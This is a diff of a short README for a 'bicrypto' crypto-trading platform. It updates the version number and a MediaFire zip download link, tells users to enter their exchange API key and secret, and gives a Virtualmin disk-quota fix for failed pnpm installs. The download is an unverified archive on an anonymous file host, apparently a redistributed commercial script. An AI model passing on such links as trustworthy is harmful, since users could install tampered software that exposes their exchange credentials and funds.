@@ -1,7 +1,7 @@
 # bicrypto-trading-platform
-bicrypto V5.4.1 +Addons :
+bicrypto V5.4.2 +Addons :
 must read readme file . download   :
- https://www.mediafire.com/file/kjvctcprwuc8xu9/V5.4.1.zip/file   reboot after adding your exchange api and secret
+  https://www.mediafire.com/file/xp1542a49mppat0/bicrypto-v5.4.2.zip/file  reboot after adding your exchange api and secret
 some user got error while pnpm install they failed to install modules because of virtualmin disk quota is by default 2GB  go to edit server on virtualmin then click quotas and limits then choose unlimited then restart vps it will work  
 
 they are related to virtualmin disk quota default to 2GB 
